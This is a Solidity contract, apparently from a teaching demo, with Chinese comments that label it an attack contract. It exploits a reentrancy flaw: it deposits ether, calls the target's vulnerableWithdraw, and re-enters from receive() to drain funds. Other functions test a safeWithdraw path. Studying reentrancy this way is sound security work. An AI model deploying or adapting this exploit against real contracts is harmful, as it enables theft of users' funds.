// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {BaseContract} from "./BaseToken.sol";

// 攻击合约
contract ReentanceAttacker {
    event TriggerReceive(address indexed address_, uint256 amount);

    BaseContract public immutable baseContract;

    uint8 public cycle;

    constructor(address tokenAddr_) {
        baseContract = BaseContract(tokenAddr_);
    }

    // 这里先充值
    function deposit() external payable {}

    // 攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "param value error");
        cycle = 0;
        // 先存再取
        baseContract.deposit{value: msg.value}();
        baseContract.vulnerableWithdraw();
        (bool success,) = msg.sender.call{value: msg.value}("");
        require(success, "call failed");
    }

    function attack2Safe() external payable {
        require(msg.value >= 1 ether, "param value error");
        cycle = 0;
        // 先存再取,重入的EHT是暂时放到合约里
        baseContract.deposit{value: msg.value}();
        baseContract.safeWithdraw();
        // 用户存入的直接取回
        (bool success,) = msg.sender.call{value: msg.value}("");
        require(success, "call failed");
    }

    function attack2Library() external payable {
        require(msg.value >= 1 ether, "param value error");
        cycle = 0;
        // 先存再取,重入的EHT是暂时放到合约里
        baseContract.deposit{value: msg.value}();
        baseContract.safeWithdraw();
        // 用户存入的直接取回
        (bool success,) = msg.sender.call{value: msg.value}("");
        require(success, "call failed");
    }

    // 这里是关键 触发回调
    receive() external payable {
        // 控制重入的深度=相当于控制递归的深度,不然就是无限递归了
        unchecked {
        //这里肯定不会溢出,也就是循环两次
            cycle++;
        }

        if (baseContract.getBalace() >= 1 ether && cycle < 3) {
            baseContract.vulnerableWithdraw();
            emit TriggerReceive(msg.sender, msg.value);
        }
    }

    function getBalace() external view returns (uint256) {
        return address(this).balance;
    }
}
